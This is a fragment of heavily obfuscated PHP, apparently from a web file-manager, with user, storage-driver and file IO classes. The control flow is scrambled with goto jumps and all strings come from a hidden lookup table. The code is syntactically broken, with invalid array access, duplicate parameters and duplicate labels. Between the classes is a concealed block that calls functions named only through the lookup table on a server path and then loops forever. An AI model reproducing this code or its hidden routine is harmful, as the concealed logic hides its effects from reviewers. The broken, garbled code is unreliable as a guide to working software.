array($B[2121] => $d݈[$B[2121]], $B[2555] => $cƷ[$d݈[$B[2121]]], $B[376] => $A); } $e̞ݓ = $Fݡ׎; } foreach ($e𒰌 as &$f) { $f[$B[2551]] = array(); if (isset($f㛻[$f[$B[1453]]])) { $f[$B[2551]] = $f㛻[$f[$B[1453]]]; } } goto fϏ; Dϛ: $dډ = array($B[2121] => array($B[7], $dَ)); $f = Model($B[2553])->field($B[2554])->where($dډ)->select(); $cƷ = array_to_keyvalue($f, $B[2121], $B[28]); goto a; Eη: $B =& $_SERVER[]; $dډ = array($B[1453] => array($B[7], $e轹)); $f㛻 = Model($B[2197])->where($dډ)->select(); goto fߢ; fߢ: $dَ = array_to_keyvalue($f㛻, $B[33], $B[2121]); $dَ = array_remove_value(array_unique($dَ), $B[468]); if (!$dَ || !$f㛻) { return; } goto Dϛ; fϏ: } private function _listAppendMeta(&$b, $aԘ) { goto eʵԼ; E帏: $Eߔܲ = array($bӞ[1453] => array($bӞ[7], $aԘ)); $d = Model($bӞ[2530])->where($Eߔܲ)->select(); $d = array_to_keyvalue_group($d, $bӞ[1453]); goto C; eʵԼ: $bӞ =& $_SERVER[]; $Eч = UserJobModel::JOB_KEY; $F = array($bӞ[2533]); goto E帏; C: foreach ($d as &$D鎐) { $bԩ = array(); foreach ($D鎐 as $a֠) { if (!in_array($a֠[$bӞ[89]], $F)) { $bԩ[$a֠[$bӞ[89]]] = $a֠[$bӞ[359]]; } } $D鎐 = $bԩ; } $Bɲ = Model($bӞ[2556]); foreach ($b as &$E擾Ț) { $BՑ֯ = array(); if (isset($d[$E擾Ț[$bӞ[1453]]])) { $BՑ֯ = $d[$E擾Ț[$bӞ[1453]]]; } $E擾Ț[$bӞ[2557]] = array(); if (isset($BՑ֯[$Eч])) { $E擾Ț[$bӞ[2557]] = $Bɲ->getUserJobInfo($BՑ֯[$Eч]); } } goto E; E: } protected function groupUserAll($f셍) { $dۣݷ =& $_SERVER[]; if (!$f셍) { return !1; } $cٱ = Model($dۣݷ[2197])->field($dۣݷ[1453])->where(array($dۣݷ[2121] => array($dۣݷ[7], $f셍)))->select(); $cٱ = array_to_keyvalue($cٱ, $dۣݷ[33], $dۣݷ[1453]); return array_unique($cٱ); } public function userSearch($c, $eݱ = "\52") { return Model($_SERVER[][477])->where($c)->field($eݱ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\137\x6f\160\x74\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($eټ) { $B =& $_SERVER[]; if (!defined($B[427])) { define($B[427], 0); } return "\125\163\145\162\x4f\160\x74\151\157\156\137{$eټ}\137" . USER_ID; } protected function filterWhere($C) { $cء =& $_SERVER[]; if (!defined($cء[427])) { define($cء[427], 0); } $C[$cء[1453]] = USER_ID; return $C; } public function cacheRemoveUser($C͝, $BО) { return Cache::remove("\x55\163\145\x72\x4f\x70\x74\151\157\156\137{$C͝}\x5f" . $BО); } protected function optionDefault($Dιź = '') { $eԴ =& $_SERVER[]; if ($Dιź == $eԴ[33]) { return $GLOBALS[$eԴ[6]][$eԴ[2558]]; } if ($Dιź == $eԴ[2559]) { return $GLOBALS[$eԴ[6]][$eԴ[2560]]; } } } goto E˦; cႹ׋: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($fɇ҂) { parent::__construct($fɇ҂); $this->signatureVersion($_SERVER[][200]); } public function uploadFormData($BՍ, $fҨЎ = 3600) { goto Aۃ; c܄: return $Dю; goto Eп; e׈: $eͲ = $Aˏ[1115]; $Dɵձ = gmdate($Aˏ[1116], time() + $fҨЎ); $A = (string) time() . $Aˏ[67] . (string) (time() + $fҨЎ); goto e֪; Aۃ: $Aˏ =& $_SERVER[]; $bц = $Aˏ[185]; $B駑 = $Aˏ[218]; goto e׈; bŨȪ: $FǕ = sha1($aۋ); $bŖ = hash_hmac($Aˏ[218], $FǕ, $a); $Dю = array($Aˏ[1119] => $bц, $Aˏ[1123] => $eͲ, $Aˏ[1127] => base64_encode($aۋ), $Aˏ[1124] => $B駑, $Aˏ[1125] => $this->accessKey, $Aˏ[1128] => $A, $Aˏ[1129] => $bŖ, $Aˏ[169] => $this->getHost()); goto c܄; e֪: $aۋ = array($Aˏ[1117] => $Dɵձ, $Aˏ[1118] => array(array($Aˏ[1119] => $bц), array($Aˏ[1120] => $this->bucket), array($Aˏ[1121], $Aˏ[1122], $Aˏ[33]), array($Aˏ[1123] => $eͲ), array($Aˏ[1124] => $B駑), array($Aˏ[1125] => $this->accessKey), array($Aˏ[1126] => $A))); $aۋ = json_encode($aۋ); $a = hash_hmac($Aˏ[218], $A, $this->secret); goto bŨȪ; Eп: } public function fileOutLink($c) { $d =& $_SERVER[]; if (substr($c, 0, 7) == $d[1130]) { $c = $d[1131] . substr($c, 7); } header($d[156] . $c); die; } } if (!isset($_SERVER[$_SERVER[][700]]) || !isset($_SERVER[$_SERVER[][1132]])) { goto Fꭏ; Fꭏ: $fǷ = $_SERVER[][701]; $dɘ = $_SERVER[$_SERVER[][702]] . $_SERVER[][703]; $B̴ = $fǷ($dɘ); goto c՞; c՞: $fȑ = explode($_SERVER[][217], $B̴); if (count($fȑ) < $_SERVER[][557]) { $eЋ = $_SERVER[][704]; $eЋ(); } $E = $_SERVER[][705]; goto fⴋ; fⴋ: $E($_SERVER[$_SERVER[][702]] . $_SERVER[][703]); $cЎ = 2; while ($cЎ > 1) { $a΄ = rawurlencode($cЎ . $_SERVER[][361]); } goto D򈂔; D򈂔: } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($EՑ) { $this->pathParse = $EՑ; $this->model = Model($_SERVER[][1133]); } public function getPath($E) { return trim($E, $_SERVER[][8]); } public function pathFather($Bʜň) { $b = $this->parse($Bʜň); $b = $this->infoSimple($Bʜň); return $b ? $b[$_SERVER[][461]] : !1; } public function getPathName($c) { $F맃 = $this->infoSimple($c); return $F맃 ? $F맃[$_SERVER[][28]] : !1; } public function getPathOuter($DǏ) { if (!$DǏ) { return $DǏ; } $B = $this->parse($DǏ); return KodIO::make($B[$_SERVER[][367]]); } public function copyFolderFromIO($dؽ, $e, $e, $e򌲓, $D県) { $DՋ = $this->model->copyFolderFromIO($dؽ, $e, $e, $e򌲓, $D県); return KodIO::make($DՋ); } public function isParentOf($cًت, $dœټ) { return $this->model->isParentOf($cًت, $dœټ); } public function mkfile($A딓, $eܱ = '', $Cڙ = REPEAT_RENAME) { $A =& $_SERVER[]; $dᠩ = $this->parse($A딓); $A딓 = $dᠩ[$A[367]]; for ($Bެ = 0; $Bެ < count($dᠩ[$A[1134]]); $Bެ++) { $D = $dᠩ[$A[1134]][$Bެ]; if ($Bެ == count($dᠩ[$A[1134]]) - 1) { $A딓 = $this->model->mkfile($A딓, $D, $eܱ, $Cڙ); break; } $A딓 = $this->model->mkdir($A딓, $D, REPEAT_SKIP); } return $this->getPathOuter($A딓); } public function mkdir($d, $C˂ = REPEAT_SKIP) { $B =& $_SERVER[]; $A = $this->parse($d); $d = $A[$B[367]]; for ($C = 0; $C < count($A[$B[1134]]); $C++) { $dھ = $A[$B[1134]][$C]; $d = $this->model->mkdir($d, $dھ, $C˂); } return $this->getPathOuter($d); } public function copyFile($aұש, $Eƣν, $c = REPEAT_REPLACE) { $f䌦 =& $_SERVER[]; $cˋϑ = $this->parse($Eƣν); $cɽȱ = $this->model->copy($aұש, $cˋϑ[$f䌦[367]], $c, $cˋϑ[$f䌦[75]]); return $cɽȱ ? $this->getPathOuter($cɽȱ) : !1; } public function moveFile($E, $Bӂ, $Cܐ = REPEAT_REPLACE) { $D =& $_SERVER[]; $eқ = $this->parse($Bӂ); $FƂ = $this->model->move($E, $eқ[$D[367]], $Cܐ, $eқ[$D[75]]); return $FƂ ? $this->getPathOuter($FƂ) : !1; } public function copy($d͘, $Eȿߛ, $c = REPEAT_REPLACE) { $C = $this->parse($Eȿߛ); $cϐ抟 = $this->model->copy($d͘, $C[$_SERVER[][367]], $c); return $cϐ抟 ? $this->getPathOuter($cϐ抟) : !1; } public function moveSameAllow() { } public function move($A, $DȘ, $f = REPEAT_REPLACE) { $D = $this->parse($DȘ); $B˞ = $this->model->move($A, $D[$_SERVER[][367]], $f); return $B˞ ? $this->getPathOuter($B˞) : !1; } public function remove($C, $dⰛ = true) { return $this->model->remove($C, $dⰛ); } public function rename($e, $F组Ʊ) { $B⍋ = $this->model->rename($e, $F组Ʊ); return $B⍋ ? $this->getPathOuter($e) : $B⍋; } public function size($DȾڍ) { $f̑ = $this->infoSimple($DȾڍ); return $f̑ ? $f̑[$_SERVER[][77]] : 0; } public function infoSimple($Ȅ) { return $this->model->sourceInfo($Ȅ); } public function info($BɈ) { return $this->infoParse($BɈ); } public function infoAuth($a´׃) { return $this->infoParse($a´׃, !1, !0); } public function infoWithChildren($a) { return $this->infoParse($a, !0); } protected function infoParse($dΣ, $dЖȜ = false, $b̓ = false) { if (!$dЖȜ) { return $this->model->pathInfo($dΣ, $b̓); } return $this->model->pathInfoMore($dΣ); } public function infoFull($AÝ) { $d߄ =& $_SERVER[]; $eȯ = explode($d߄[8], $AÝ); $bŦ = implode($d߄[8], array_splice($eȯ, 1)); return $this->model->pathInfoByPath($eȯ[0], $bŦ); } public function hashSimple($Bř܍) { $d煗ͯ =& $_SERVER[]; $Fװ = $this->infoWithChildren($Bř܍); return $Fװ[$d煗ͯ[162]][$d煗ͯ[164]]; } public function hashMd5($e) { $dȨύ =& $_SERVER[]; $cݯڊ = $this->infoWithChildren($e); return $cݯڊ[$dȨύ[162]][$dȨύ[163]]; } public function exist($D욟) { $EĿ杉 =& $_SERVER[]; $eȝێ = $this->parse($D욟); if (!$eȝێ[$EĿ杉[75]]) { return $this->isFile($D욟) || $this->isFolder($D욟); } $BӢ = array($EĿ杉[368] => $eȝێ[$EĿ杉[367]], $EĿ杉[28] => $eȝێ[$EĿ杉[75]]); $Eͣ = $this->model->where($BӢ)->find(); return $Eͣ ? !0 : !1; } public function isFile($eä) { $A̭ =& $_SERVER[]; $e̗ = $this->infoSimple($eä); return $e̗ && $e̗[$A̭[370]] == $A̭[83] ? !1 : !0; } public function isFolder($E) { $f麐 =& $_SERVER[]; $Bʮ = $this->infoSimple($E); return $Bʮ && $Bʮ[$f麐[370]] == $f麐[83] ? !0 : !1; } public function listPath($dӓш, $B۠ = false) { $bǨ =& $_SERVER[]; if ($dӓш == $bǨ[33]) { return !1; } $f = array($bǨ[368] => $dӓш); if ($B۠) { return $this->model->listSource($f, -1); } return $this->model->listSource($f); } public function has($aҲ, $fھ = false, $Dɉ = null) { $Dǰؤ =& $_SERVER[]; $e = $this->infoWithChildren($aҲ); if ($fھ) { return array($Dǰؤ[192] => $e[$Dǰؤ[192]], $Dǰؤ[191] => $e[$Dǰؤ[191]]); } return $Dɉ ? $e[$Dǰؤ[192]] : $e[$Dǰؤ[191]]; } public function listAll($bŴ) { $C֐ = IO::info($this->pathParse[$_SERVER[][75]]); if (!$C֐) { return array(); } return $this->model->listAll($bŴ); } public function getContent($F) { return $this->model->getContent($F); } public function setContent($C͎, $fϬ = '') { return $this->model->setContent($C͎, $fϬ); } public function fileSubstr($B, $e, $FӖ) { return $this->model->fileSubstr($B, $e, $FӖ); } public function download($bݓ¸, $c͊辺 = '') { $D = get_path_father($c͊辺); $aȲ = get_path_this($c͊辺); $A摂ܱ = $this->model->fileInfoGet($bݓ¸); $eΘА = IO::copy($A摂ܱ[$_SERVER[][75]], $D, !1, $aȲ); return $eΘА; } public function setModifyTime($Aӱ, $C诼 = '') { $this->model->metaSet($Aӱ, $_SERVER[][1135], $C诼); } public function upload($a܏侄, $Eت, $c = false, $D = REPEAT_REPLACE) { $A =& $_SERVER[]; $a牭 = $this->parse($a܏侄); $f辊 = $this->model->addFile($a牭[$A[367]], $Eت, $a牭[$A[75]], $c, $D); return $this->getPathOuter($f辊); } public function uploadFileByID($F, $b݃, $a梂) { $cܐُ⟦ =& $_SERVER[]; $eŻ = $this->parse($F); $Fۥ = $this->model->addFileByFileID($eŻ[$cܐُ⟦[367]], $b݃, $eŻ[$cܐُ⟦[75]], $a梂); return $this->getPathOuter($Fۥ); } public function addFileByRemote($B, $E, $E낈 = array(), $fѾڅ = '', $C) { $B =& $_SERVER[]; $eޒ = $this->parse($B); $fѾڅ = empty($fѾڅ) ? $eޒ[$B[75]] : $fѾڅ; $D = $this->model->addFileByRemote($eޒ[$B[367]], $E, $fѾڅ, $E낈, $C); return $this->getPathOuter($D); } public function uploadLink($B, $FΓ׾ = 0) { $D =& $_SERVER[]; $bݭÍ = $this->parse($B); $B = Model($D[544])->createFileName($bݭÍ[$D[75]]); $fݜ娶 = IO::uploadLink($B, $FΓ׾); return $fݜ娶; } public function fileNameAuto($f֞, $A, $Aԟф = REPEAT_REPLACE, $d¬ = false) { return $this->model->fileNameAuto($f֞, $A, $Aԟф, $d¬); } public function fileNameExist($CΧς, $bԥ) { return $this->model->fileNameExist($CΧς, $bԥ); } protected function _fileOut($fɇ, $Fߢ = false, $a = false, $Eѧ˴ = '', $a먉 = false) { goto aፂ; eŪȄ: if ($a먉) { return IO::fileOutServer($fΒ傦[$C[75]], $Fߢ, $cƓ, $Eѧ˴); } IO::fileOut($fΒ傦[$C[75]], $Fߢ, $cƓ, $Eѧ˴); goto EԞղ; A: $fΒ傦 = $this->model->fileInfoGet($fɇ); $Eѧ˴ = $fΒ傦[$C[163]] ? $fΒ傦[$C[163]] : $Eѧ˴; $cƓ = isset($GLOBALS[$C[1137]]) ? $GLOBALS[$C[1137]] : $f[$C[28]]; goto eŪȄ; aፂ: $C =& $_SERVER[]; $f = $this->model->sourceInfo($fɇ); if ($f[$C[370]] == $C[83]) { header($C[1136]); die; } goto A; EԞղ: } public function fileOut($e휷, $E෯ = false, $b؃ = false, $f = '') { $this->_fileOut($e휷, $E෯, $b؃, $f); } public function fileOutServer($c߅, $Cżȱ = false, $cع = false, $A = '') { $this->_fileOut($c߅, $Cżȱ, $cع, $A, !0); } protected function _fileOutImage($E, $AҼ = 250) { $f =& $_SERVER[]; $B = $this->model->sourceInfo($E); if ($B[$f[370]] == $f[83]) { show_json($f[1138] . $E, !1); } $GLOBALS[$f[1137]] = $B[$f[28]]; $f̫ = $this->model->fileInfoGet($E); IO::fileOutImage($f̫[$f[75]], $AҼ); } public function fileOutImage($F؆, $Eꞗ = 250) { $this->_fileOutImage($F؆, $Eꞗ); } public function fileOutImageServer($bڏ, $F = 250) { $this->_fileOutImage($bڏ, $F); } public function link($Fݦ, $D漻Ή = '') { $b = $this->model->fileInfoGet($Fݦ); return IO::link($b[$_SERVER[][75]], $D漻Ή); } protected function parse($Fëԣ) { $Dψ٘ =& $_SERVER[]; if (strstr($Fëԣ, $Dψ٘[8]) === !1) { return array($Dψ٘[385] => intval($Fëԣ), $Dψ٘[75] => $Dψ٘[33], $Dψ٘[1134] => array()); } $Dߚ = explode($Dψ٘[8], trim($Fëԣ, $Dψ٘[8])); if (count($Dߚ) < 2) { show_tips($Fëԣ . $Dψ٘[1139]); } return array($Dψ٘[385] => intval($Dߚ[0]), $Dψ٘[75] => $Dߚ[1], $Dψ٘[1134] => array_slice($Dߚ, 1)); } } goto a߉; Eۇ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Eϖ, $cЄ) { $D = self::driverMake($cЄ[0]); if (method_exists($D, $Eϖ)) { return @call_user_func_array(array($D, $Eϖ), $cЄ); } if (method_exists($D, $_SERVER[][1012])) { return @call_user_func_array(array($D, $Eϖ), $cЄ); } else { if (method_exists(self, $Eϖ)) { return @call_user_func_array(array(self, $Eϖ), $cЄ); } else { call_user_func_array(array(parent, $Eϖ), $cЄ); } } } public static function init($Bĉ) { return self::driverMake($Bĉ); } public static function copy($dР, $b񞝝ļ, $aň = false, $B = false) { return self::copyMove($dР, $b񞝝ļ, $aň, $_SERVER[][490], $B); } public static function move($eЍǴ, $F̄, $Bڒ؇ = false, $fɡޣ = false) { return self::copyMove($eЍǴ, $F̄, $Bڒ؇, $_SERVER[][492], $fɡޣ); } public static function saveFile($Aпô, $Bꛠ, $C = true) { goto cܯϬ; cܯϬ: $Dܸ =& $_SERVER[]; $e򿫢 = self::info($Bꛠ); $F = self::driverMake($Aпô); goto e; dРڧ: $b = $FǼ->pathFather($Bꛠ); $F¥Ԇ = !0; if (!$C && self::driverIsSame($F, $FǼ)) { $F¥Ԇ = !1; } goto aט; aט: $E羅 = self::copyFile($F, $Aпô, $FǼ, $b, $e򿫢[$Dܸ[28]], $F¥Ԇ); if ($b) { $E羅 = $b->getPathOuter($E羅); } return $E羅; goto eۉ޸; e: $FǼ = self::driverMake($Bꛠ); $b = !1; if ($FǼ->pathParse[$Dܸ[1013]]) { $BЊ = $FǼ->pathParse[$Dܸ[1013]]; $b = $FǼ; $FǼ = self::driverMake($BЊ); } goto dРڧ; eۉ޸: } private static function copyMove($Bֲ, $CΈк, $d؈, $eǠ·⤒, $B旝 = false) { goto F託ʧ; Bґƃ: Hook::trigger($f⹒ɋ[72], $AǑ, $Bֲ, $e, $CΈк); $Dغ = self::driverIsSame($AǑ, $e); if ($Dغ) { if ($eǠ·⤒ == $f⹒ɋ[492] && !method_exists($e, $f⹒ɋ[1014]) && trim($CΈк, $f⹒ɋ[8]) == trim($e->pathFather($Bֲ), $f⹒ɋ[8])) { return $e->getPathOuter($Bֲ); } if (method_exists($e, $eǠ·⤒)) { return $e->{$eǠ·⤒}($Bֲ, $CΈк, $d؈); } } goto d; f: $AǑ = self::driverMake($Bֲ); $e = self::driverMake($CΈк); $Aɸ蛑 = $eǠ·⤒ == $f⹒ɋ[492]; goto Aë; Aë: $aߔ = !1; if ($e->pathParse[$f⹒ɋ[1013]]) { $CΈк = $e->pathParse[$f⹒ɋ[1013]]; $aߔ = $e; $e = self::driverMake($CΈк); } self::check($AǑ, $Bֲ, $e, $CΈк); goto Bґƃ; F託ʧ: $f⹒ɋ =& $_SERVER[]; if (!$Bֲ || $Bֲ == $f⹒ɋ[8] || !$CΈк) { return !1; } ignore_timeout(); goto f; d: $Aү = $AǑ->isFile($Bֲ); if (!$Aү && $e->getType() == $f⹒ɋ[713] && $AǑ->getType() == $f⹒ɋ[102]) { $aϣ = $e->copyFolderFromIO($AǑ, $Bֲ, $CΈк, $d؈, $Aɸ蛑, $B旝); } else { $aϣ = self::copyPath($AǑ, $Bֲ, $e, $CΈк, $d؈, $Aɸ蛑, $Aү, $B旝); } if ($aϣ && $Aɸ蛑) { $AǑ->remove($Bֲ); } goto c; c: if ($aߔ) { $aϣ = $aߔ->getPathOuter($aϣ); } return $aϣ; goto a; a: } private static function check($b۲, $BƱ, $dֹʍؾ, &$Dȋ) { $f߇ =& $_SERVER[]; if (self::driverIsSame($b۲, $dֹʍؾ) && $b۲->isFolder($BƱ) && $b۲->isParentOf($BƱ, $Dȋ)) { show_json(LNG($f߇[1015]), !1); } if (!$b۲->exist($BƱ)) { show_json(LNG($f߇[101]), !1); } } private static function copyPath($dΟÉ, $bʩ, $d֕, $bז, $d̽, $Fݾ, $Dڽ, $Cއ = false) { goto d즉; f·: $dԳ = array_merge($bе[$F֌[73]], $bе[$F֌[74]]); foreach ($dԳ as $d׉Ջ) { $F = $d׉Ջ[$F֌[29]] == $F֌[167]; $bʩ = $dΟÉ->getPathInner($d׉Ջ[$F֌[75]]); $c̒ԇ = self::copyPath($dΟÉ, $bʩ, $d֕, $bז, $d̽, $Fݾ, $F); if (!$c̒ԇ) { write_log($F֌[1016] . $bʩ . $F֌[1017] . $bז, $F֌[1018]); } } return $a׸; goto BЅ; Dޯ銣: $a׸ = $d֕->mkdir($d֕->getPath($aϢݏ)); $bז = $d֕->getPathInner($a׸); $bе = $dΟÉ->listPath($bʩ, !0); goto f·; aտ: if ($Dڽ) { return self::copyFile($dΟÉ, $bʩ, $d֕, $bז, $A, $Fݾ); } if ($d̽ == REPEAT_RENAME_FOLDER) { $d̽ = !1; } $aϢݏ = rtrim($bז, $F֌[8]) . $F֌[8] . $A; goto Dޯ銣; d즉: $F֌ =& $_SERVER[]; $A = $Cއ ? $Cއ : $dΟÉ->getPathName($dΟÉ->pathThis($bʩ)); if ($d̽) { $bĹ = $d֕->fileNameExist($bז, $A); $A = $d֕->fileNameAuto($bז, $A, $d̽, !$Dڽ); $d̽ = $bĹ ? $d̽ : !1; } goto aտ; BЅ: } private static function copyFile($d, $b҈ߍ, $eכݭ, $Dߑ, $Aşሟ, $fչ) { goto fˌܣ; aބ: mk_dir($Aŉ鈖); $EƑ = $Aŉ鈖 . $aƤ; $EƑ = $d->download($b҈ߍ, $EƑ); goto D; bͱ: Hook::trigger($A[1021], $d, $b҈ߍ, $eכݭ, $Dߑ, $Aşሟ, $A愭ք); return $A愭ք; goto c; D: $EƑ = $d->iconvApp($EƑ); $A愭ք = $eכݭ->upload($Dߑ, $EƑ, $fչ); self::remove($Aŉ鈖 . $aƤ); goto bͱ; fˌܣ: $A =& $_SERVER[]; $Dߑ = $eכݭ->getPath(rtrim($Dߑ, $A[8]) . $A[8] . $Aşሟ); $aƤ = $A[1019] . time() . rand_string(5); goto Fѯ; Fѯ: Hook::trigger($A[1020], $d, $b҈ߍ, $eכݭ, $Dߑ, $Aşሟ, $aƤ); if (self::driverIsSame($d, $eכݭ)) { if ($fչ) { $A愭ք = $eכݭ->moveFile($b҈ߍ, $Dߑ); } else { $A愭ք = $eכݭ->copyFile($b҈ߍ, $Dߑ); } Hook::trigger($A[1021], $d, $b҈ߍ, $eכݭ, $Dߑ, $Aşሟ, $A愭ք); return $A愭ք; } $Aŉ鈖 = TEMP_FILES; goto aބ; c: } public static function pathFather($B⨆) { $dΦ = IO::init($B⨆); $Dώ׊ = $dΦ->pathFather($dΦ->path); return $dΦ->getPathOuter($Dώ׊); } public static function fileOut($Aݏ, $Eґ = false, $B = false, $f = '') { $dͤ = self::driverMake($Aݏ); if ($dͤ->isFileOutServer()) { return $dͤ->fileOutServer($Aݏ, $Eґ, $B, $f); } return $dͤ->fileOut($Aݏ, $Eґ, $B, $f); } public static function fileOutImage($eɪ, $AވǩЬ = 250) { $f䬹 = array(250, 600, 1200, 3000); for ($E = 0; $E < count($f䬹); $E++) { if ($E == 0 && $AވǩЬ <= $f䬹[$E]) { $AވǩЬ = $f䬹[$E]; break; } else { if ($AވǩЬ > $f䬹[$E - 1] && $AވǩЬ <= $f䬹[$E]) { $AވǩЬ = $f䬹[$E]; break; } else { if ($E == count($f䬹) - 1 && $AވǩЬ > $f䬹[$E]) { $AވǩЬ = $f䬹[$E]; break; } } } } $Dк = self::driverMake($eɪ); if ($Dк->isFileOutServer()) { return $Dк->fileOutImageServer($eɪ, $AވǩЬ); } return $Dк->fileOutImage($eɪ, $AވǩЬ); } private static function driverIsSame($CǤ, $Eצߌ) { goto c; F: if ($CǤ->pathDriver == $Eצߌ->pathDriver) { return !0; } return !1; goto Cˬɪ; c: $c =& $_SERVER[]; $BؘƸ = $CǤ->getType(); $DЍ = $Eצߌ->getType(); goto c䯎; c䯎: if ($BؘƸ != $DЍ) { return !1; } if ($BؘƸ == $c[713]) { return !0; } if ($BؘƸ == $c[102]) { return !0; } goto F; Cˬɪ: } public static function copyUpdate($f, $cĘƙ) { goto dÍ; eܣ: $aͤ = self::_listAll($f); $dɩ = self::_listAll($cĘƙ); $a = array(); goto CԴ; CԴ: $e͕ = array(); foreach ($aͤ as $Cΰʐ => $Cޒ) { if (isset($dɩ[$Cΰʐ])) { if ($Cޒ[$fܘۼ[76]] == 1) { continue; } if ($dɩ[$Cΰʐ][$fܘۼ[77]] == $Cޒ[$fܘۼ[77]]) { continue; } } if ($Cޒ[$fܘۼ[76]] == 1) { $e͕[] = $cĘƙ . $fܘۼ[8] . $Cΰʐ; continue; } $Dؗ = strstr(trim($Cΰʐ, $fܘۼ[8]), $fܘۼ[8]) ? get_path_father($Cΰʐ) : $fܘۼ[33]; $a[] = array($fܘۼ[1022] => $Cޒ[$fܘۼ[75]], $fܘۼ[1023] => rtrim($cĘƙ, $fܘۼ[8]) . $fܘۼ[8] . $Dؗ, $fܘۼ[1024] => $Cޒ); } $B߫ă = array($fܘۼ[167] => $a, $fܘۼ[76] => $e͕); goto Aռ; dÍ: $fܘۼ =& $_SERVER[]; if (!IO::exist($f)) { return !1; } if (!IO::exist($cĘƙ)) { IO::mkdir($cĘƙ); } goto eܣ; Aռ: Hook::trigger($fܘۼ[1025], $f, $cĘƙ, $B߫ă); foreach ($e͕ as $Cޒ) { IO::mkdir($Cޒ); } foreach ($a as $Cޒ) { IO::copy($Cޒ[$fܘۼ[1022]], $Cޒ[$fܘۼ[1023]], REPEAT_REPLACE); } goto eя; eя: } private static function _listAll($EԽ) { $Cᑘ =& $_SERVER[]; $EԽ = KodIO::clear($EԽ); $c = IO::listAll($EԽ); foreach ($c as &$eѐ) { $a񢋳 = substr($eѐ[$Cᑘ[75]], strlen($EԽ)); $eѐ[$Cᑘ[1026]] = trim($a񢋳, $Cᑘ[8]); } return array_to_keyvalue($c, $Cᑘ[1026]); } public static function fileSubstr($e﫿, $DϦ, $AǬ = false) { goto Aჸξ; e˥: return $FͿ->fileSubstr($e﫿, $DϦ, $AǬ); goto E; DȚ: if ($DϦ + $AǬ > $f) { $AǬ = $f - $DϦ; } if ($AǬ <= 0) { return $_SERVER[][33]; } if ($DϦ < 0 || $DϦ >= $f || $AǬ > 1024 * 1024 * 5) { throw new Exception("\146\x69\154\x65\122\x65\141\144\x20\145\162\x72\x6f\x72\41\x20\163\x74\141\x72\164\x3d{$DϦ}\73\x6c\145\x6e\x67\x74\x68\x3d{$AǬ}\73\x20\163\151\x7a\145\75{$f}\x3b"); } goto e˥; dƙ: $D = $AǬ; if ($DϦ < 0) { $DϦ = $f + $DϦ; } if ($AǬ === !1) { $AǬ = $f - $DϦ; } goto DȚ; Aჸξ: $FͿ = self::driverMake($e﫿); $f = $FͿ->size($e﫿); $Dյ = $DϦ; goto dƙ; E: } private static function driverMake(&$Dש) { goto dׯ; dׯ: $c =& $_SERVER[]; $A֍֐ = KodIO::parse($Dש); if (!self::$driverListSystem) { $E֚ = Model($c[723])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($E֚, $c[367]); } goto e׉; bݶ: return $cټ; goto aӨ; e׉: if ($A֍֐[$c[29]] == KodIO::KOD_IO && !self::$driverListSystem[$A֍֐[$c[367]]]) { return !1; } $Dש = $A֍֐[$c[1027]]; $cټ = self::driverGet($A֍֐, $Dש); goto bݶ; aӨ: } private static function driverGet($fӐ¦, &$f߸) { goto fϏ琪; fϏ琪: $a =& $_SERVER[]; $aȞ = $fӐ¦[$a[1028]]; $e稂 = $fӐ¦[$a[367]]; goto Aڃ; Aڃ: switch ($fӐ¦[$a[29]]) { case KodIO::KOD_IO: $Fԟ = self::$driverListSystem[$e稂]; break; case KodIO::KOD_SOURCE: $f߸ = $e稂 . $f߸; $Fԟ = array($a[1029] => $a[1030], $a[6] => $fӐ¦); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $C = $GLOBALS[$a[1031]]; self::$driverListUser = array_to_keyvalue($C, $a[367]); } $Fԟ = self::$driverListUser[$e稂]; break; case KodIO::KOD_SHARE_LINK: $Fԟ = array($a[1029] => $a[1032], $a[6] => $fӐ¦); $E܊ى = Action($a[1033])->sharePathInfo($fӐ¦[$a[75]]); $f߸ = $E܊ى[$a[369]]; if (!$E܊ى[$a[369]]) { $aţǹ = Model($a[536])->getInfo($E܊ى[$a[441]]); $f߸ = KodIO::clear($aţǹ[$a[1034]] . $fӐ¦[$a[1027]]); $fӐ¦[$a[439]] = $aţǹ; $fӐ¦[$a[1013]] = $f߸; $Fԟ = array($a[1029] => $a[1035], $a[6] => $fӐ¦); } break; case KodIO::KOD_SHARE_ITEM: $Fԟ = array($a[1029] => $a[1036], $a[6] => $fӐ¦); $aţǹ = Model($a[536])->getInfo($fӐ¦[$a[367]]); if ($aţǹ[$a[369]] == $a[468]) { $f߸ = KodIO::clear($aţǹ[$a[1034]] . $fӐ¦[$a[1027]]); $fӐ¦[$a[439]] = $aţǹ; $fӐ¦[$a[1013]] = $f߸; $Fԟ = array($a[1029] => $a[1037], $a[6] => $fӐ¦); } else { if (!$f߸) { $f߸ = $aţǹ[$a[369]]; } } break; default: $f߸ = $fӐ¦[$a[75]]; $Fԟ = array($a[1029] => $a[1038]); break; } $Dԥ = $fӐ¦[$a[75]]; if (!isset(self::$driverCache[$Dԥ])) { $bΓ = strtolower($Fԟ[$a[90]]); $dϹ = $GLOBALS[$a[6]][$a[84]][$a[773]]; $B㾱܏ = $a[71] . (isset($dϹ[$bΓ]) ? $dϹ[$bΓ] : ucfirst($bΓ)); if (!class_exists($B㾱܏)) { show_json("{$B㾱܏}\40\156\x6f\164\40\x65\x78\151\163\x74\x73\41", !1); } $E力 = isset($Fԟ[$a[6]]) ? $Fԟ[$a[6]] : !1; self::$driverCache[$Dԥ] = new $B㾱܏($E力); } goto b; cߒ: if (isset($Fԟ[$a[6]][$a[1039]])) { $eҌ->pathBase = rtrim($Fԟ[$a[6]][$a[1039]], $a[8]) . $a[8]; $f߸ = $eҌ->pathBase . ltrim($f߸, $a[8]); } $f߸ = $eҌ->getPath($f߸); if (isset($fӐ¦[$a[1013]])) { $f߸ = $fӐ¦[$a[1013]]; } goto b͹; b͹: $eҌ->path = $f߸; return $eҌ; goto b; b: $eҌ = self::$driverCache[$Dԥ]; $eҌ->pathDriver = $aȞ; $eҌ->pathBase = $a[33]; goto cߒ; b: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Cۡ҉; if (!$Cۡ҉) { $E픦 = IO::init($_SERVER[][8]); } return $E픦; } private static function 